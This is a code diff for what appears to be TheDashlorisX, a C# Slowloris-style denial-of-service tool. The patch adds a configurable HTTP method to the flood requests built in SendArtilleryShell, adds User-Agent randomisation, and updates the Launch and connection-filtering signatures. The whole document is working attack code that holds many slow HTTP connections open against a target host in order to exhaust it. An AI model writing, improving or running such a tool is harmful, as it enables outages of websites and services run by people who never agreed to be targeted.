@@ -33,6 +33,24 @@ namespace TheDashlorisX
 	    (SprucyLog.S1Container1.Visible);
 
 
+	string Replace(string Variable, string newValue, params string[] replaceValues)
+	{
+	    try
+	    {
+		foreach (string value in replaceValues)
+		{
+		    Variable = Variable.Replace(value, newValue);
+		}
+
+		return Variable;
+	    }
+
+	    catch (Exception E)
+	    {
+		throw (ErrorHandler.GetException(E));
+	    }
+	}
+
 	(string, int, int, string) ParseSect1(LockOn S3Class1)
 	{
 	    try
@@ -55,24 +73,6 @@ namespace TheDashlorisX
 		int Duration = DashNet.GetInteger(S3Class1.S2TextBox3.Text);
 		int Port = DashNet.GetPort(S3Class1.S2TextBox2.Text);
 
-		string Replace(string Variable, string newValue, params string[] replaceValues)
-		{
-		    try
-		    {
-			foreach (string value in replaceValues)
-			{
-			    Variable = Variable.Replace(value, newValue);
-			}
-
-			return Variable;
-		    }
-
-		    catch (Exception E)
-		    {
-			throw (ErrorHandler.GetException(E));
-		    }
-		}
-
 		string HTTPv = Replace(S3Class1.S2Label5.Text, "", "(", ")", "---", " ");
 		string Host = DashNet.GetIP(S3Class1.S2TextBox1.Text);
 
@@ -85,7 +85,7 @@ namespace TheDashlorisX
 	    }
 	}
 
-	(int, int, int, int, int, bool) ParseSect2(Settings S3Class2)
+	(int, int, int, int, int, string, bool) ParseSect2(Settings S3Class2)
 	{
 	    try
 	    {
@@ -104,20 +104,20 @@ namespace TheDashlorisX
 		{
 		    if (!DashNet.CanInteger(TextBox.Text))
 		    {
-			return (-1, -1, -1, -1, -1, false);
+			return (-1, -1, -1, -1, -1, "", false);
 		    }
 
 		    Collection.Add(DashNet.GetInteger(TextBox.Text));
 		}
 
 		if (Collection[3] / Collection[2] < 1)
-		    return (-1, -1, -1, -1, -1, false);
+		    return (-1, -1, -1, -1, -1, "", false);
 
-		bool UAR = (S3Class2.S2Container3.BackColor == 
-		    Color.DarkMagenta ? true : false);
+		var UAR = (S3Class2.S2Container3.BackColor == Color.DarkMagenta ? true : false);
+		var METH = (Replace(S3Class2.S2Label7.Text, "", "(", ")", "---", " "));
 
 		return (Collection[0], Collection[1], 
-		    Collection[2], Collection[3], Collection[4], UAR);
+		    Collection[2], Collection[3], Collection[4], METH, UAR);
 	    }
 
 	    catch (Exception E)
@@ -156,7 +156,7 @@ namespace TheDashlorisX
 		SendLog("- Validating configuration ....");
 
 		/*Send Delay, Timeout, Dash Workers, Max Cons, Content Length and UAR*/                
-		(int, int, int, int, int, bool) Tier2 = ParseSect2(S3Class2);
+		(int, int, int, int, int, string, bool) Tier2 = ParseSect2(S3Class2);
 		/*Host, Port, Duration and HTTP Version*/
 		(string, int, int, string) Tier1 = ParseSect1(S3Class1);
 
@@ -270,7 +270,7 @@ namespace TheDashlorisX
 		}
 	    }
 
-	    private void SendArtilleryShell(Socket DashShell, (string, int, int, string) Tier1, (int, int, int, int, int, bool) Tier2)
+	    private void SendArtilleryShell(Socket DashShell, (string, int, int, string) Tier1, (int, int, int, int, int, string, bool) Tier2)
 	    {
 		try
 		{
@@ -282,12 +282,11 @@ namespace TheDashlorisX
 
 			    string Coal = string.Format
 			    (
-				($"POST / HTTP/@\r\n".Replace("@", Tier1.Item4)) +
+				($"@1 / HTTP/@2\r\n".Replace("@1", Tier2.Item6).Replace("@2", Tier1.Item4)) +
 				($"Host: @\r\n".Replace("@", Tier1.Item1)) +
 				($"Content-Length: @\r\n".Replace("@", Tier2.Item5.ToString())) +
-				($@"User-Agent: {(Tier2.Item6 ? GetRandomUA() : Default)}" + $"\r\n") +
-				($"Accept-Encoding: gzip, deflate\r\n") +
-				($"Upgrade-Insecure-Requests: 1\r\n") +
+				($@"User-Agent: {(Tier2.Item7 ? GetRandomUA() : Default)}" + $"\r\n") +
+				($@"{(Tier2.Item6.Equals("POST") ? "Accept-Encoding: gzip, deflate\r\nUpgrade-Insecure-Requests: 1\r\n" : "")}") +
 				($"Cookie: DashlorisXCookie;\r\n\r\n")
 			    );
 
@@ -380,7 +379,7 @@ namespace TheDashlorisX
 		}
 	    }
 
-	    void FilterConnectables(ref List<Socket> Connectables, SpruceLog Logy, (string, int, int, string) Tier1, (int, int, int, int, int, bool) Tier2)
+	    void FilterConnectables(ref List<Socket> Connectables, SpruceLog Logy, (string, int, int, string) Tier1, (int, int, int, int, int, string, bool) Tier2)
 	    {
 		try
 		{
@@ -446,7 +445,7 @@ namespace TheDashlorisX
 		}
 	    }
 
-	    public void Launch(AttaccLog Inst, SpruceLog Logy, (string, int, int, string) Tier1, (int, int, int, int, int, bool) Tier2)
+	    public void Launch(AttaccLog Inst, SpruceLog Logy, (string, int, int, string) Tier1, (int, int, int, int, int, string, bool) Tier2)
 	    {
 		try
 		{
